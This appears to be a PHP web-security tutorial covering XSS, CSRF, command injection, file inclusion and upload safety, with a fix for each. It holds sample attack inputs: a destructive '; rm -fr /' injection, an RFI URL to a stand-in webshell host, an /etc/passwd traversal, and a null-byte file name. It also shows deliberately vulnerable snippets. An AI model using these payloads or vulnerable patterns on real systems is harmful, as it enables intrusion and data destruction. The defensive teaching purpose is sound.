---
metaTitle: "PHP - Security"
description: "PHP Version Leakage, Cross-Site Scripting (XSS), Cross-Site Request Forgery, Command Line Injection, Error Reporting, File Inclusion, Stripping Tags, Uploading files"
---

# Security


As the majority of websites run off PHP, application security is an important topic for PHP developers to protect their website, data, and clients. This topic covers best security practices in PHP as well as common vulnerabilities and weaknesses with example fixes in PHP.



## PHP Version Leakage


By default, PHP will tell the world what version of PHP you are using, e.g.

```php
X-Powered-By: PHP/5.3.8

```

To fix this you can either change php.ini:

```php
expose_php = off

```

Or change the header:

```php
header("X-Powered-By: Magic");

```

Or if you'd prefer a htaccess method:

```php
Header unset X-Powered-By

```

If either of the above methods do not work, there is also the [`header_remove()`](http://php.net/header_remove) function that provides you the ability to remove the header:

```php
header_remove('X-Powered-By');

```

If attackers know that you are using PHP and the version of PHP that you are using, it's easier for them to exploit your server.



## Cross-Site Scripting (XSS)


### Problem

Cross-site scripting is the unintended execution of remote code by a web client.  Any web application might expose itself to XSS if it takes input from a user and outputs it directly on a web page.  If input includes HTML or JavaScript, remote code can be executed when this content is rendered by the web client.

For example, if a 3rd party side contains a [JavaScript](http://stackoverflow.com/documentation/javascript/231/promises/846/introduction#t=201607242111378436991) file:

```php
// http://example.com/runme.js
document.write("I'm running");

```

And a PHP application directly outputs a string passed into it:

```php
<?php
echo '<div>' . $_GET['input'] . '</div>';

```

If an unchecked GET parameter contains `<script src="http://example.com/runme.js"></script>` then the output of the PHP script will be:

```php
<div><script src="http://example.com/runme.js"></script></div>

```

The 3rd party JavaScript will run and the user will see "I'm running" on the web page.

### Solution

As a general rule, never trust input coming from a client.  Every GET, POST, and cookie value could be anything at all, and should therefore be validated.  When outputting any of these values, escape them so they will not be evaluated in an unexpected way.

Keep in mind that even in the simplest applications data can be moved around and it will be hard to keep track of all sources.  Therefore it is a best practice to **always** escape output.

PHP provides a few ways to escape output depending on the context.

### Filter Functions

[PHPs Filter Functions](http://php.net/manual/en/ref.filter.php) allow the input data to the php script to be [sanitized](http://php.net/manual/en/filter.filters.sanitize.php) or [validated](http://php.net/manual/en/filter.filters.validate.php) in [many ways](http://php.net/manual/en/filter.filters.php). They are useful when saving or outputting client input.

### HTML Encoding

`htmlspecialchars` will convert any "HTML special characters" into their HTML encodings, meaning they will then **not** be processed as standard HTML.  To fix our previous example using this method:

```php
<?php
echo '<div>' . htmlspecialchars($_GET['input']) . '</div>';
// or
echo '<div>' . filter_input(INPUT_GET, 'input', FILTER_SANITIZE_SPECIAL_CHARS) . '</div>';

```

Would output:

```php
<div>&lt;script src=&quot;http://example.com/runme.js&quot;&gt;&lt;/script&gt;</div>

```

Everything inside the `<div>` tag will **not** be interpreted as a JavaScript tag by the browser, but instead as a simple text node. The user will safely see:

```php
<script src="http://example.com/runme.js"></script>

```

### URL Encoding

When outputting a dynamically generated URL, PHP provides the `urlencode` function to safely output valid URLs.  So, for example, if a user is able to input data that becomes part of another GET parameter:

```php
<?php
$input = urlencode($_GET['input']);
// or
$input = filter_input(INPUT_GET, 'input', FILTER_SANITIZE_URL);
echo '<a href="http://example.com/page?input="' . $input . '">Link</a>';

```

Any malicious input will be converted to an encoded URL parameter.

### Using specialised external libraries or OWASP AntiSamy lists

Sometimes you will want to send HTML or other kind of code inputs. You will need to maintain a list of authorised words (white list) and un-authorized (blacklist).

You can download standard lists available at the [OWASP AntiSamy website](https://www.owasp.org/index.php/Category:OWASP_AntiSamy_Project). Each list is fit for a specific kind of interaction (ebay api, tinyMCE, etc...). And it is open source.

There are libraries existing to filter HTML and prevent XSS attacks for the general case and performing at least as well as AntiSamy lists with very easy use.
For example you have [HTML Purifier](http://htmlpurifier.org/)



## Cross-Site Request Forgery


### Problem

Cross-Site Request Forgery or `CSRF` can force an end user to unknowingly generate malicious requests to a web server. This attack vector can be exploited in both POST and GET requests. Let's say for example the url endpoint `/delete.php?accnt=12` deletes account as passed from `accnt` parameter of a GET request. Now if an authenticated user will encounter the following script in any other application

```php
<img src="http://domain.com/delete.php?accnt=12" width="0" height="0" border="0">

```

the account would be deleted.

### Solution

A common solution to this problem is the use of **CSRF tokens**. CSRF tokens are embedded into requests so that a web application can trust that a request came from an expected source as part of the application's normal workflow.  First the user performs some action, such as viewing a form, that triggers the creation of a unique token. A sample form implementing this might look like

```php
<form method="get" action="/delete.php">
  <input type="text" name="accnt" placeholder="accnt number" />
  <input type="hidden" name="csrf_token" value="<randomToken>" />
  <input type="submit" />
</form>

```

The token can then be validated by the server against the user session after form submission to eliminate malicious requests.

### Sample code

Here is sample code for a basic implementation:

```php
/* Code to generate a CSRF token and store the same */
...
<?php
  session_start();
  function generate_token() {
    // Check if a token is present for the current session
    if(!isset($_SESSION["csrf_token"])) {
        // No token present, generate a new one
        $token = random_bytes(64);
        $_SESSION["csrf_token"] = $token;
    } else {
        // Reuse the token
        $token = $_SESSION["csrf_token"];
    }
    return $token;
  }
?>
<body>
  <form method="get" action="/delete.php">
    <input type="text" name="accnt" placeholder="accnt number" />
    <input type="hidden" name="csrf_token" value="<?php echo generate_token();?>" />
    <input type="submit" />
  </form>
</body>
...


/* Code to validate token and drop malicious requests */
...
<?php
  session_start();
  if ($_GET["csrf_token"] != $_SESSION["csrf_token"]) {
    // Reset token
    unset($_SESSION["csrf_token"]);
    die("CSRF token validation failed");
  }
?>
...

```

There are many libraries and frameworks already available which have their own implementation of CSRF validation. Though this is the simple implementation of CSRF, You need to write some code to **regenerate** your CSRF token dynamically to prevent from CSRF token stealing and fixation.



## Command Line Injection


### Problem

In a similar way that SQL injection allows an attacker to execute arbitrary queries on a database, command-line injection allows someone to run untrusted system commands on a web server.  With an improperly secured server this would give an attacker complete control over a system.

Let's say, for example, a script allows a user to list directory contents on a web server.

```php
<pre>
<?php system('ls ' . $_GET['path']); ?>
</pre>

```

**(In a real-world application one would use PHP's built-in functions or objects to get path contents. This example is for a simple security demonstration.)**

One would hope to get a `path` parameter similar to `/tmp`.  But as any input is allowed, `path` could be `; rm -fr /`.  The web server would then execute the command

```php
ls; rm -fr /

```

and attempt to delete all files from the root of the server.

### Solution

All command arguments must be **escaped** using `escapeshellarg()` or `escapeshellcmd()`. This makes the arguments non-executable.  For each parameter, the input value should also be **validated**.

In the simplest case, we can secure our example with

```php
<pre>
<?php system('ls ' . escapeshellarg($_GET['path'])); ?>
</pre>

```

Following the previous example with the attempt to remove files, the executed command becomes

```php
ls '; rm -fr /'

```

And the string is simply passed as a parameter to `ls`, rather than terminating the `ls` command and running `rm`.

It should be noted that the example above is now secure from command injection, but not from directory traversal. To fix this, it should be checked that the normalized path starts with the desired sub-directory.

PHP offers a variety of functions to execute system commands, including `exec`, `passthru`, `proc_open`, `shell_exec`, and `system`.  All must have their inputs carefully validated and escaped.



## Error Reporting


By default PHP will output **errors**, **warnings** and **notice** messages directly on the page if something unexpected in a script occurs. This is useful for resolving specific issues with a script but at the same time it outputs information you don't want your users to know.

Therefore it's good practice to avoid displaying those messages which will reveal information about your server, like your directory tree for example, in production environments.  In a development or testing environment these messages may still be useful to display for debugging purposes.

### A quick solution

You can turn them off so the messages don't show at all, however this makes debugging your script harder.

```php
<?php
  ini_set("display_errors", "0");
?>

```

Or change them directly in the **php.ini**.

```php
display_errors = 0

```

### Handling errors

A better option would be to store those error messages to a place they are more useful, like a database:

```php
set_error_handler(function($errno , $errstr, $errfile, $errline){
  try{
    $pdo = new PDO("mysql:host=hostname;dbname=databasename", 'dbuser', 'dbpwd', [
      PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ]);

    if($stmt = $pdo->prepare("INSERT INTO `errors` (no,msg,file,line) VALUES (?,?,?,?)")){
      if(!$stmt->execute([$errno, $errstr, $errfile, $errline])){
        throw new Exception('Unable to execute query');
      }
    } else {
      throw new Exception('Unable to prepare query');
    }
  } catch (Exception $e){
    error_log('Exception: ' . $e->getMessage() . PHP_EOL . "$errfile:$errline:$errno | $errstr");
  }
});

```

This method will log the messages to the database and if that fails to a file instead of echoing it directly into the page. This way you can track what users are experiencing on your website and notify you immediately if something go's wrong.



## File Inclusion


### Remote File Inclusion

Remote File Inclusion (also known as RFI) is a type of vulnerability that allows an attacker to include a remote file.

This example injects a remotely hosted file containing a malicious code:

```php
<?php
include $_GET['page'];

```

> 
/vulnerable.php?page=[http://evil.example.com/webshell.txt](http://evil.example.com/webshell.txt)?


### Local File Inclusion

Local File Inclusion (also known as LFI) is the process of including files on a server through the web browser.

```php
<?php
$page = 'pages/'.$_GET['page'];
if(isset($page)) {
    include $page;
} else {
    include 'index.php';
}

```

> 
/vulnerable.php?page=../../../../etc/passwd


### Solution to RFI & LFI:

It is recommended to only allow including files you approved, and limit to those only.

```php
<?php
$page = 'pages/'.$_GET['page'].'.php';
$allowed = ['pages/home.php','pages/error.php'];
if(in_array($page,$allowed)) {
    include($page);
} else {
    include('index.php');
}

```



## Stripping Tags


[`strip_tags`](http://php.net/manual/en/function.strip-tags.php) is a very powerful function if you know how to use it. As a method to prevent [cross-site scripting attacks](http://stackoverflow.com/documentation/php/2781/security/11883/cross-site-scripting-xss#t=201704202055152207702) there are better methods, such as character encoding, but stripping tags is useful in some cases.

### Basic Example

```php
$string = '<b>Hello,<> please remove the <> tags.</b>';

echo strip_tags($string);

```

**Raw Output**

```php
Hello, please remove the tags.

```

### Allowing Tags

Say you wanted to allow a certain tag but no other tags, then you'd specify that in the second parameter of the function. This parameter is optional. In my case I only want the `<b>` tag to be passed through.

```php
$string = '<b>Hello,<> please remove the <br> tags.</b>';

echo strip_tags($string, '<b>');

```

**Raw Output**

```php
<b>Hello, please remove the  tags.</b>

```

### Notice(s)

`HTML` comments and `PHP` tags are also stripped. This is hardcoded and can not be changed with allowable_tags.

In `PHP` 5.3.4 and later, self-closing `XHTML` tags are ignored and only non-self-closing tags should be used in allowable_tags. For example, to allow both `<br>` and `<br/>`, you should use:

```php
<?php
strip_tags($input, '<br>');
?>

```



## Uploading files


If you want users to upload files to your server you need to do a couple of security checks before you actually move the uploaded file to your web directory.

### The uploaded data:

This array contains ****user**** **submitted data** and is **not** information about the file itself. While usually this data is generated by the browser one can easily make a post request to the same form using software.

```php
$_FILES['file']['name'];
$_FILES['file']['type'];
$_FILES['file']['size'];
$_FILES['file']['tmp_name'];

```


- `name` - Verify every aspect of it.
- `type` - Never use this data. It can be fetched by using PHP functions instead.
- `size` - Safe to use.
- `tmp_name` - Safe to use.

### Exploiting the file name

Normally the operating system does not allow specific characters in a file name, but by spoofing the request you can add them allowing for unexpected things to happen. For example, lets name the file:<br><br> `../script.php%00.png`<br><br>Take good look at that filename and you should notice a couple of things.

1. The first to notice is the `../`, fully illegal in a file name and at the same time perfectly fine if you are moving a file from 1 directory to another, which we're gonna do right?
1. Now you might think you were verifying the file extensions properly in your script but this exploit relies on the url decoding, translating `%00` to a `null` character, basically saying to the operating system, this string ends here, stripping off `.png` off the filename.

So now I've uploaded `script.php` to another directory, by-passing simple validations to file extensions. It also by-passes `.htaccess` files disallowing scripts to be executed from within your upload directory.

### Getting the file name and extension safely

You can use [`pathinfo()`](http://php.net/manual/en/function.pathinfo.php) to extrapolate the name and extension in a safe manner but first we need to replace unwanted characters in the file name:

```php
// This array contains a list of characters not allowed in a filename
$illegal   = array_merge(array_map('chr', range(0,31)), ["<", ">", ":", '"', "/", "\\", "|", "?", "*", " "]);
$filename  = str_replace($illegal, "-", $_FILES['file']['name']);

$pathinfo  = pathinfo($filename);
$extension = $pathinfo['extension'] ? $pathinfo['extension']:'';
$filename  = $pathinfo['filename']  ? $pathinfo['filename']:'';

if(!empty($extension) && !empty($filename)){
  echo $filename, $extension;
} else {
  die('file is missing an extension or name');
}

```

While now we have a filename and extension that can be used for storing, I still prefer storing that information in a database and give that file a generated name of for example, `md5(uniqid().microtime())`

```php
+----+--------+-----------+------------+------+----------------------------------+---------------------+
| id | title  | extension | mime       | size | filename                         | time                |
+----+--------+-----------+------------+------+----------------------------------+---------------------+
| 1  | myfile | txt       | text/plain | 1020 | 5bcdaeddbfbd2810fa1b6f3118804d66 | 2017-03-11 00:38:54 |
+----+--------+-----------+------------+------+----------------------------------+---------------------+

```

This would resolve the issue of duplicate file names and unforseen exploits in the file name. It would also cause the attacker to guess where that file has been stored as he or she cannot specifically target it for execution.

### Mime-type validation

Checking a file extension to determine what file it is is not enough as a file may named `image.png` but may very well contain a php script. By checking the mime-type of the uploaded file against a file extension you can verify if the file contains what its name is referring to.

You can even go 1 step further for validating images, and that is actually opening them:

```php
if($mime == 'image/jpeg' && $extension == 'jpeg' || $extension == 'jpg'){
  if($img = imagecreatefromjpeg($filename)){
    imagedestroy($img);
  } else {
    die('image failed to open, could be corrupt or the file contains something else.');
  }
}

```

You can fetch the mime-type using a build-in [function](http://php.net/manual/en/function.mime-content-type.php) or a [class](http://php.net/manual/en/book.fileinfo.php).

### White listing your uploads

Most importantly, you should whitelist file extensions and mime types depending on each form.

```php
function isFiletypeAllowed($extension, $mime, array $allowed)
{
    return  isset($allowed[$mime]) &&
            is_array($allowed[$mime]) &&
            in_array($extension, $allowed[$mime]);
}

$allowedFiletypes = [
    'image/png'  => [ 'png' ],
    'image/gif'  => [ 'gif' ],
    'image/jpeg' => [ 'jpg', 'jpeg' ],
];

var_dump(isFiletypeAllowed('jpg', 'image/jpeg', $allowedFiletypes));

```



#### Remarks


**See Also**

- [Preventing SQL Injection with Parameterized Queries in PDO](http://stackoverflow.com/documentation/php/5828/pdo/2685/preventing-sql-injection-with-parameterized-queries#t=201704202058314626537)
- [Prepared Statements in mysqli](http://stackoverflow.com/documentation/php/2784/php-mysqli/11958/prepared-statements-in-mysqli#t=201704202104063734533)
- [Open Web Application Security Project (OWASP)](https://www.owasp.org/index.php/Main_Page)

